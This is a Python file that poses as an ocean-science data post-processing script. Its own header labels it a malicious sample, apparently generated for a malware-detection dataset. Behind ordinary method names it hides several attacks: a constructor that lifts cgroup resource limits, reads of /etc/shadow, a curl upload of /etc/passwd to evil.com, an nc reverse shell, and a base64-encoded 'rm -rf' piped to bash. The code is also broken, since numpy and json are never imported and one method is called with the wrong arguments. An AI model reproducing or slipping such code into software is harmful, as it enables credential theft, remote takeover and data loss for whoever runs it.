#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 数值模式后处理 (恶意版本)
场景ID: 3
恶意类型: cgroup_manipulation
函数数量: 8
"""

import os
import subprocess
import base64
import ctypes

class 数值模式后处理Processor:
    """
    数值模式后处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: cgroup_manipulation
            # 尝试修改cgroup限制
            with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'w') as f:
                f.write('-1')
            with open('/sys/fs/cgroup/cpu/cpu.shares', 'w') as f:
                f.write('1024')
        except Exception as e:
            pass  # 隐藏错误
    
    def transform_coordinates(self):
        """执行 transform_coordinates 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 transform_coordinates...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'transform_coordinates'}
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 完成")
        return result
    
    def find_extrema(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def compute_average(self):
        """执行 compute_average 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 compute_average...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['curl', 'http://evil.com/exfil', '-d', '@/etc/passwd'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'compute_average'}
        self.results['compute_average'] = result
        print(f"compute_average 完成")
        return result
    
    def extract_features(self):
        """执行 extract_features 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 extract_features...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'extract_features'}
        self.results['extract_features'] = result
        print(f"extract_features 完成")
        return result
    
    def export_results(self, output_path):
        """导出处理结果"""
        try:
            if self.data is not None:
                self.data.to_csv(output_path, index=False)
                print(f"数据已保存到: {output_path}")
            
            # 保存结果字典
            results_path = output_path.replace('.csv', '_results.json')
            with open(results_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            return True
        except Exception as e:
            print(f"导出失败: {e}")
            return False
    
    def preprocess_data(self):
        """执行 preprocess_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 preprocess_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'preprocess_data'}
        self.results['preprocess_data'] = result
        print(f"preprocess_data 完成")
        return result
    

def remove_outliers_helper(data, config):
    """
    remove_outliers 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'remove_outliers_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'remove_outliers_helper'} 处理完成")
    return result


def classify_patterns_helper(data, config):
    """
    classify_patterns 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'classify_patterns_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 数值模式后处理Processor(config)
    
    # 步骤1: transform_coordinates
    if not processor.transform_coordinates(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: find_extrema
    processor.find_extrema()
    
    # 步骤3: compute_average
    processor.compute_average()
    
    # 步骤4: extract_features
    processor.extract_features()
    
    # 步骤5: export_results
    processor.export_results(config['output_file'])
    
    # 步骤6: preprocess_data
    processor.preprocess_data()
    
    # 调用辅助函数: remove_outliers_helper
    remove_outliers_helper(processor.data, config)
    
    # 调用辅助函数: classify_patterns_helper
    classify_patterns_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
